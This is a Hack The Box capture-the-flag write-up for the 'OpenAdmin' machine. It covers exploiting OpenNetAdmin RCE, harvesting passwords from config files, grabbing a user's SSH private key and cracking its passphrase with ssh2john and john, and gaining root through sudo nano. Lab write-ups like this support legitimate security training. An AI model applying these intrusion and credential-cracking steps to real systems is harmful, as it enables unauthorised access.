---
description: https://app.hackthebox.com/machines/222
---

# 🏸 OpenAdmin

<figure><img src="../../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>

#### There are three directories on the webserver. `/artwork`, `sierra`, and what else?

<figure><img src="../../.gitbook/assets/image (475).png" alt=""><figcaption></figcaption></figure>

#### On the page at `/music`, there is a link that doesn't point to another link on `/music`, but rather an administration tool. What is the relative path?

On the /login, we get access to a "control panel"

<figure><img src="../../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

#### What is the version number of OpenNetAdmin that runs on the remote machine?

<figure><img src="../../.gitbook/assets/image (477).png" alt=""><figcaption></figcaption></figure>

#### If you exploit this instance to get code execution on the machine, in the context of what user is the execution happening?

Found this repo on the OpenNetAdmin 18.1.1 -> [https://github.com/amriunix/ona-rce/blob/master/ona-proof.png](https://github.com/amriunix/ona-rce/blob/master/ona-proof.png)

just cloned it and looked at the syntax&#x20;

<figure><img src="../../.gitbook/assets/image (478).png" alt=""><figcaption><p>Easy W</p></figcaption></figure>

#### What's the password of the user, jimmy?

First, we download linenum.sh and rename it with lower cases&#x20;

then on our local machine, we open a local python server&#x20;

then on our shell we `wget [local.IP]:port/linenum.sh`

<figure><img src="../../.gitbook/assets/image (479).png" alt=""><figcaption></figcaption></figure>

don't forget to "chmod +x linenum.sh" before running it

We unfortunately don't find anything, so let's enum manually

after a bit of enumeration, we wind in the /local/config file ->

<figure><img src="../../.gitbook/assets/image (480).png" alt=""><figcaption></figcaption></figure>

interesting passwd occurrence, let's try to abuse it&#x20;

open another terminal and try to connect to jimmy utilizing ssh ->

<figure><img src="../../.gitbook/assets/image (481).png" alt=""><figcaption></figcaption></figure>

some more enumeration later, we find a main.php file with a password inside jimmy's session:

<figure><img src="../../.gitbook/assets/image (482).png" alt=""><figcaption></figcaption></figure>

let's try to connect to the other user that's on this machine:

<figure><img src="../../.gitbook/assets/image (483).png" alt=""><figcaption></figcaption></figure>

While doing a `cat main.php` -> we can see this output:

<figure><img src="../../.gitbook/assets/image (485).png" alt=""><figcaption></figcaption></figure>

We see that there is a `shell_exec` command that executes the shell command `cat /home/joanna/.ssh/id_rsa`. This command retrieves the content of the file `/home/joanna/.ssh/id_rsa`, which contains the RSA private key.

Let's try a simple curl:

<figure><img src="../../.gitbook/assets/image (486).png" alt=""><figcaption></figcaption></figure>

weird, let's try to see what's happening in the background ->

<figure><img src="../../.gitbook/assets/image (484).png" alt=""><figcaption></figcaption></figure>

we can see some things are listening on the backend, let's try via those ports

the 3306 did not work, but ->

<figure><img src="../../.gitbook/assets/image (487).png" alt=""><figcaption></figcaption></figure>

That's a very nice find, let's continue&#x20;

copy and paste the key on your local machine in a sshkey file, then download ssh2john [https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)

make the file executable with a chmod +x and then:&#x20;

```
python ssh2john.py rsakey >output
```

<figure><img src="../../.gitbook/assets/image (488).png" alt=""><figcaption></figcaption></figure>

and now let's try to brute force this ssh key ->

```
john --wordlist=/usr/share/wordlists/rockyou.txt output
```

<figure><img src="../../.gitbook/assets/image (489).png" alt=""><figcaption></figcaption></figure>

Massive W here boys -> let's get onto the next step

so now we know the passphrase for the ssh key is "bloodninjas"

set chmod 600 to the rsakey file, or it will not let you use it&#x20;

then&#x20;

```
sudo ssh -i rsakey joanna@10.129.208.136
```

<figure><img src="../../.gitbook/assets/image (490).png" alt=""><figcaption></figcaption></figure>

First Privesc step of this user will be the famous "sudo -l" command

<figure><img src="../../.gitbook/assets/image (491).png" alt=""><figcaption></figcaption></figure>

We then&#x20;

```
sudo /bin/nano /opt/priv
```

then, we CRTL+R

<figure><img src="../../.gitbook/assets/image (492).png" alt=""><figcaption></figcaption></figure>

and we get the result:

<figure><img src="../../.gitbook/assets/image (493).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (494).png" alt=""><figcaption></figcaption></figure>
